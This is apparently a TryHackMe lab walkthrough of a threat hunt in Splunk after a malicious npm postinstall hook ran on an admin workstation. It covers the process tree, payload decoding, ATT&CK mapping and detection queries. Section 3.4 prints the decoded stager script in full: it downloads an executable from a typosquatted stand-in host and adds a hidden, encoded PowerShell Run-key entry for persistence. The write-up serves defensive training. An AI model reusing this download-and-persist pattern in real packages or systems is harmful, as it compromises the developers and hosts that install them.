# Threat Hunt Walkthrough: npm Supply Chain Compromise on PAW-TOM

> **Platform:** TryHackMe – Threat Hunting challenge (TryGovMe environment)
> **SIEM:** Splunk (index `main`, Sysmon via `WinEventLog:Microsoft-Windows-Sysmon/Operational`)
> **Role:** Threat Hunter
> **Focus:** IOC-driven hunting, process-tree reconstruction, PowerShell deobfuscation, MITRE ATT&CK mapping

---

## 1. Scenario

A threat intelligence brief (TLP:AMBER, fictional) described a campaign targeting the npm and PyPI ecosystems. The actor gains maintainer trust on under-maintained open-source libraries, then publishes "minor" releases that hide malicious post-install payloads. These packages act as **stagers**: they download second-stage payloads, establish persistence, or steal credentials from developer machines.

### Objectives

1. Validate a hunting hypothesis
2. Review IOCs shared by compromised partner organisations
3. Reconstruct the attack chain
4. Determine the scope of the incident
5. Produce a threat hunting report

### Hypothesis

> An attacker may have leveraged a compromised third-party software package to gain initial access to the system and silently stage a payload for later execution. They likely established persistence to maintain access without immediate detection.

The hypothesis makes **three testable claims**:

| # | Claim | What would prove it |
|---|---|---|
| A | Initial access via a compromised package | A package install that spawns unexpected child processes |
| B | A payload was staged silently | A hidden download of an executable |
| C | Persistence was established | An autostart registry entry or similar |

### IOCs provided

**Host-based**

| Type | Value |
|---|---|
| NPM package | `healthchk-lib@1.0.1` |
| Registry path | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| Registry value name | `Windows Update Monitor` |
| Registry value data | `powershell.exe -NoP -W Hidden -EncodedCommand <base64>` |
| Dropped file | `%APPDATA%\SystemHealthUpdater.exe` |
| PowerShell | `Invoke-WebRequest -Uri ... -OutFile ...` |
| Script artifact | `package.json` → `"postinstall"` |

**Network-based**

| Type | Value |
|---|---|
| Download URL | `http://global-update.wlndows.thm/SystemHealthUpdater.exe` |
| Hostname | `global-update.wlndows.thm` |
| Protocol / port | HTTP / 80 |

---

## 2. Approach

The SIEM had a high volume of alerts, so triaging them one by one was not practical. Instead I used **IOC pivoting**:

1. **Search the most unique IOC strings first.** Rare strings (a typosquatted domain, a specific package name) produce few, high-signal hits.
2. **Anchor on the first hit.** Record host, user, process ID/GUID and timestamp.
3. **Pivot.** Use those values to find what happened just before and just after.
4. **Build a timeline** as evidence accumulates.
5. **Widen** to other hosts to determine scope.

Why these IOCs first:

- `wlndows` – a typosquat of "windows" (lowercase **L** instead of **i**). It should never appear in legitimate traffic.
- `healthchk-lib` – a specific package name, unlikely to collide with anything else.
- `SystemHealthUpdater` – a specific file name.

Generic IOCs like `powershell.exe` or the `Run` key path are useful later for confirmation, but too noisy as a starting point.

---

## 3. Investigation

### 3.1 First pivot: the malicious domain

```spl
search wlndows
```

**Hit – Sysmon Event ID 22 (DNS query), 21/06/2025 10:58:29**

| Field | Value |
|---|---|
| Host | `PAW-TOM` |
| User | `PAW-TOM\itadmin-tom` |
| Image | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| ProcessId | `5880` |
| ProcessGuid | `{c5d2b969-9053-6856-e701-000000002a01}` |
| QueryName | `global-update.wlndows.thm` |
| QueryResults | `::ffff:127.0.0.1` |
| RecordNumber | `43455` |

**Takeaways**

- Affected host: **PAW-TOM**. Affected user: **itadmin-tom**.
- PowerShell resolved the attacker's domain, which matches the "download via PowerShell" IOC.
- The name `paw-tom` suggests a **Privileged Access Workstation** and the account is an IT admin, which raises the potential impact.
- The domain resolved to `127.0.0.1`. In a lab this usually means the domain is sinkholed or redirected locally, so it is not a usable C2 IP.
- **PID 5880** becomes the pivot for the next search: what launched it?

### 3.2 Second pivot: the package

```spl
search healthchk-lib
```

This returned four events that explain where PID 5880 came from.

**Event A – Sysmon 1 (Process Create), 10:58:24, Record 43445**

| Field | Value |
|---|---|
| Image | `C:\Program Files\nodejs\node.exe` |
| CommandLine | `node.exe npm-cli.js install healthchk-lib@1.0.1` |
| CurrentDirectory | `C:\Development\` |
| ParentImage | `powershell.exe` (PID 1452, interactive, no arguments) |
| User | `PAW-TOM\itadmin-tom` |
| IntegrityLevel | High |
| ProcessId | `1924` |

→ The admin manually ran `npm install healthchk-lib@1.0.1` from an interactive PowerShell in the `C:\Development` project folder. This is the **initial access** event.

**Event B – Sysmon 11 (File Create), 10:58:27, Record 43448**

| Field | Value |
|---|---|
| Image | `node.exe` (PID 1924) |
| TargetFilename | `C:\Development\node_modules\healthchk-lib\scripts\postinstall.ps1` |

→ npm unpacked the package, which includes a PowerShell post-install script.

**Event C – Sysmon 1, 10:58:27, Record 43450**

| Field | Value |
|---|---|
| Image | `C:\Windows\System32\cmd.exe` (PID 1616) |
| CommandLine | `cmd.exe /d /s /c powershell.exe -NoP -W Hidden -EncodedCommand JABkAGUAcwB0...` |
| ParentImage | `node.exe` (PID 1924, the npm install) |
| CurrentDirectory | `C:\Development\node_modules\healthchk-lib\` |

→ `cmd.exe /d /s /c` is exactly how npm runs lifecycle scripts on Windows. This is the **`postinstall` hook firing**.

**Event D – Sysmon 1, 10:58:27, Record 43451**

| Field | Value |
|---|---|
| Image | `powershell.exe` (**PID 5880**) |
| CommandLine | `powershell.exe -NoP -W Hidden -EncodedCommand JABkAGUAcwB0...` |
| ParentImage | `cmd.exe` (PID 1616) |

→ This is the same PID 5880 that made the DNS query in 3.1. **The chain is now linked end to end.**

### 3.3 Reconstructed process tree

```
powershell.exe            PID 1452   interactive admin shell
└── node.exe              PID 1924   npm install healthchk-lib@1.0.1
    ├── [FileCreate]                  ...\healthchk-lib\scripts\postinstall.ps1
    └── cmd.exe           PID 1616   /d /s /c  (npm lifecycle script runner)
        └── powershell.exe PID 5880  -NoP -W Hidden -EncodedCommand ...
            └── [DNS]                 global-update.wlndows.thm
```

**Key detection insight:** a package manager (`node.exe`/npm) spawning a **hidden, encoded PowerShell** is highly anomalous. Legitimate post-install scripts compile native modules or copy files; they rarely need hidden windows or base64.

### 3.4 Deobfuscating the payload

PowerShell's `-EncodedCommand` takes **base64 of UTF-16LE text**. A plain base64 decode produces output with null bytes between characters, so the text encoding has to be set explicitly.

**CyberChef recipe:** `From Base64` → `Decode text (UTF-16LE (1200))`

**PowerShell (decode only, never pipe to `iex`):**

```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("<BASE64>"))
```

**Linux:**

```bash
echo "<BASE64>" | base64 -d | iconv -f UTF-16LE -t UTF-8
```

**Decoded script:**

```powershell
$dest = "$env:APPDATA\SystemHealthUpdater.exe"
$url = "http://global-update.wlndows.thm/SystemHealthUpdater.exe"

# Download file
Invoke-WebRequest -Uri $url -OutFile $dest

# Base64 encode the command
$encoded = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes("Start-Process '$dest'")
)

# Build persistence command
$runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded

# Add to registry for persistence
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'Windows Update Monitor' -Value $runCmd
```

**What it does**

| Step | Code | Purpose |
|---|---|---|
| 1 | `$dest`, `$url` | Drop location in the user's roaming profile; download from the typosquatted domain |
| 2 | `Invoke-WebRequest ... -OutFile` | **Stages** the second-stage payload over plain HTTP |
| 3 | `ToBase64String(... "Start-Process '$dest'")` | Builds a *second* encoded command so the exe path is not visible in the registry in plain text |
| 4 | `Set-ItemProperty ... \Run` | **Persistence**: runs the hidden launcher at every logon of this user |

**Important:** the script does **not** execute the payload immediately. It downloads it and schedules it for the next logon. This is consistent with the "stage a payload for later execution" wording in the hypothesis, and it means execution evidence should appear later, after a logon, with a different parent process.

Because it writes to **HKCU**, no administrative rights are needed and the persistence is scoped to `itadmin-tom`.

---

## 4. Timeline

All events on **PAW-TOM**, user **PAW-TOM\itadmin-tom**, 21 June 2025.

| Time | Sysmon ID | Record | Event | Evidence |
|---|---|---|---|---|
| 10:58:24 | 1 | 43445 | npm install of malicious package | `node.exe npm-cli.js install healthchk-lib@1.0.1`, parent `powershell.exe` (1452) |
| 10:58:27 | 11 | 43448 | Post-install script written to disk | `...\healthchk-lib\scripts\postinstall.ps1` |
| 10:58:27 | 1 | 43450 | npm lifecycle runner starts | `cmd.exe /d /s /c powershell.exe -NoP -W Hidden -EncodedCommand ...` |
| 10:58:27 | 1 | 43451 | Hidden encoded PowerShell starts | `powershell.exe` PID 5880 |
| 10:58:29 | 22 | 43455 | C2/staging domain resolved | `global-update.wlndows.thm` by PID 5880 |
| *pending* | 3 | – | HTTP connection to staging server | Expected: PID 5880 → port 80 |
| *pending* | 11 | – | Payload written | Expected: `%APPDATA%\SystemHealthUpdater.exe` |
| *pending* | 13 | – | Run key created | Expected: `...\CurrentVersion\Run\Windows Update Monitor` |
| *pending* | 1 | – | Payload execution after logon | Expected: hidden PowerShell → `SystemHealthUpdater.exe` |

The gaps in record numbers (43446–43447, 43449, 43452–43454) indicate events not yet reviewed, most likely the network connection, file drop and registry write.

---

## 5. MITRE ATT&CK Mapping

| Stage | Tactic | Technique | Evidence |
|---|---|---|---|
| Malicious package installed | Initial Access | **T1195.001** Supply Chain Compromise: Compromise Software Dependencies and Development Tools | `npm install healthchk-lib@1.0.1` |
| User runs the install | Execution | **T1204** User Execution | Interactive admin shell launched npm |
| Post-install runs PowerShell | Execution | **T1059.001** Command and Scripting Interpreter: PowerShell | `node.exe` → `cmd.exe` → `powershell.exe` |
| Base64 command, hidden window | Defense Evasion | **T1027** Obfuscated Files or Information; **T1564.003** Hide Artifacts: Hidden Window | `-EncodedCommand`, `-W Hidden`, `-NoP` |
| Fake names and lookalike domain | Defense Evasion | **T1036** Masquerading | `wlndows.thm`, "SystemHealthUpdater", "Windows Update Monitor" |
| Payload download over HTTP | Command and Control | **T1105** Ingress Tool Transfer; **T1071.001** Web Protocols | `Invoke-WebRequest` to port 80 |
| Run key autostart | Persistence | **T1547.001** Boot or Logon Autostart Execution: Registry Run Keys | `Set-ItemProperty ... \Run` |

---

## 6. Hypothesis Verdict

| Claim | Status | Basis |
|---|---|---|
| A – Initial access via compromised package | **Confirmed** | npm install of `healthchk-lib@1.0.1` directly spawned the malicious process chain (Records 43445 → 43450 → 43451) |
| B – Payload staged silently | **Confirmed by script, network evidence partial** | Decoded command contains the download; hidden window; DNS resolution of the staging domain (43455) |
| C – Persistence established | **Supported by script, registry event pending** | Decoded command writes the `Windows Update Monitor` Run value; Sysmon 13 confirmation still to be collected |

**Overall: the hypothesis is valid.** The process lineage alone proves the package was the entry point, and the decoded command shows both staging and persistence. The remaining Sysmon 3/11/13 events would turn B and C from "intended by the attacker" into "observed on the host".

---

## 7. Scope (current)

| Entity | Value | Notes |
|---|---|---|
| Host | `PAW-TOM` | Likely a privileged access workstation |
| User | `PAW-TOM\itadmin-tom` | IT admin, High integrity session, Logon ID `0x5D561` |
| Project folder | `C:\Development\` | Contains the malicious `node_modules\healthchk-lib` |
| Other hosts/users | Not yet checked | See section 8 |

---

## 8. Open Items and Next Steps

1. **Fill the timeline gaps** on PAW-TOM:
   ```spl
   index=main host=PAW-TOM earliest="06/21/2025:10:58:20" latest="06/21/2025:11:10:00"
   | sort _time
   | table _time EventCode Image CommandLine TargetFilename TargetObject Details DestinationIp DestinationPort
   ```
2. **Payload drop (Sysmon 11):**
   ```spl
   index=main EventCode=11 TargetFilename="*SystemHealthUpdater*"
   ```
3. **Persistence (Sysmon 13):** collect the `Details` field and decode the second base64 string (expected: `Start-Process '...\SystemHealthUpdater.exe'`).
   ```spl
   index=main EventCode=13 TargetObject="*CurrentVersion\\Run*"
   ```
4. **Network (Sysmon 3):**
   ```spl
   index=main EventCode=3 Image="*powershell.exe" DestinationPort=80
   ```
5. **Payload execution and follow-on activity:** process creation of `SystemHealthUpdater.exe`, its hashes, children, network connections, and any credential access (e.g. Sysmon 10 on `lsass.exe`). This reveals the attacker's final objective.
   ```spl
   index=main EventCode=1 (Image="*SystemHealthUpdater*" OR ParentImage="*SystemHealthUpdater*")
   ```
6. **Scope across the environment:**
   ```spl
   index=main ("SystemHealthUpdater" OR "wlndows.thm" OR "healthchk-lib" OR "Windows Update Monitor") NOT host=PAW-TOM
   ```

---

## 9. Detection Opportunities

Ideas for turning this hunt into lasting detections:

- **Package manager spawning encoded/hidden PowerShell**
  ```spl
  index=main EventCode=1 Image="*\\powershell.exe"
      (CommandLine="*-EncodedCommand*" OR CommandLine="*-enc *" OR CommandLine="*-W Hidden*")
      (ParentCommandLine="*npm-cli.js*" OR ParentImage="*\\node.exe")
  ```
  Note that the direct parent is `cmd.exe`, so in practice correlate on the grandparent or the `ParentCommandLine` of `cmd.exe` containing `npm`.
- **New Run key values containing `powershell` and `-EncodedCommand`** (Sysmon 13).
- **Executables written to `%APPDATA%` root** by `powershell.exe` (Sysmon 11).
- **DNS lookups for lookalike domains** of trusted vendors (e.g. `wlndows`, `micros0ft`).
- **Hardening:** `npm config set ignore-scripts true` on privileged workstations, an internal package proxy with allowlisting, lockfiles with integrity hashes, and no software development on PAWs.

---

## 10. Lessons Learned

- **Start with the rarest IOC.** One search for a typosquatted domain found the affected host, user and process in seconds, despite a noisy SIEM.
- **Process IDs and GUIDs are the thread.** Matching PID 5880 between the DNS event and the process creation event connected the network IOC to the package install.
- **Know what "normal" looks like.** `cmd.exe /d /s /c` under `node.exe` is how npm runs scripts. Recognising that pattern made the postinstall hook obvious.
- **Decode, don't execute.** Base64 PowerShell is UTF-16LE; decoding it safely revealed the attacker's full intent, including a second layer of encoding.
- **Distinguish intent from evidence.** The script shows what the attacker *intended*; the SIEM shows what *happened*. A good report keeps those separate.
- **Context changes severity.** A supply chain compromise on a privileged admin workstation is far more serious than on a standard laptop.

---

## Appendix: Hashes Observed

These belong to **legitimate system binaries** abused during the attack, not to malware. They are recorded for completeness, not as IOCs.

| Binary | SHA256 |
|---|---|
| `node.exe` 22.16.0 | `C5FF4C736112DD483C750FD4149D30C8A116DB1A49B8B3EC88BE4B65E6C86C19` |
| `cmd.exe` | `BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527` |
| `powershell.exe` | `DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C` |

The hash of `SystemHealthUpdater.exe` should be added once its process creation or file creation event is collected.
